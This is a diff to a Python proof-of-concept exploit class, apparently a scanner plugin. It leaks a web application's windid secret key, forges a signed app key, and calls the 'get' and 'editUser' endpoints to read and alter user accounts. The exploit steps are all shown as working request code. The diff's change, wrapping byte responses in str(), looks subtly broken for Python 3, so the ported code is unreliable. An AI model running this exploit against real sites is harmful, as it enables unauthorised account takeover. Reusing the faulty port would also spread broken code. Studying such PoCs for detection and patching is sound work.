@@ -70,7 +70,7 @@ class Poc(ABPoc):
             match_windidkey = re.compile(
                 'windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
             request = urllib.request.Request(windidkey_url, headers=header)
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
             # Get windidkey
             try:
                 windidkey, _time = match_windidkey.findall(response)[0]
@@ -80,7 +80,7 @@ class Poc(ABPoc):
             # Get secretkey
             request = urllib.request.Request(secretkey_url % (
                 url, uid, windidkey, _time), data='uid=undefined')
-            response = json.loads(urllib.request.urlopen(request).read())
+            response = json.loads(str(urllib.request.urlopen(request).read()))
             try:
                 secretkey = response['1']['secretkey']
             except:
@@ -116,7 +116,7 @@ class Poc(ABPoc):
             match_windidkey = re.compile(
                 'windidkey%3D([\w\d]{32})%26time%3D([\d]+)%26')
             request = urllib.request.Request(windidkey_url, headers=header)
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
 
             # Get windidkey
             try:
@@ -128,7 +128,7 @@ class Poc(ABPoc):
             # Get secretkey
             request = urllib.request.Request(secretkey_url % (
                 url, uid, windidkey, _time), data='uid=undefined')
-            response = json.loads(urllib.request.urlopen(request).read())
+            response = json.loads(str(urllib.request.urlopen(request).read()))
             try:
                 secretkey = response['1']['secretkey']
             except:
@@ -142,7 +142,7 @@ class Poc(ABPoc):
                 md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
             request = urllib.request.Request(vul_url % (
                 url, 'get', app_key, _time), data=urllib.parse.urlencode(data))
-            response = json.loads(urllib.request.urlopen(request).read())
+            response = json.loads(str(urllib.request.urlopen(request).read()))
             try:
                 username = response['username']
             except:
@@ -156,7 +156,7 @@ class Poc(ABPoc):
                 md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
             request = urllib.request.Request(vul_url % (
                 url, 'editUser', app_key, _time), data=urllib.parse.urlencode(data))
-            response = urllib.request.urlopen(request).read()
+            response = str(urllib.request.urlopen(request).read())
 
             # Success
             if response == '1':
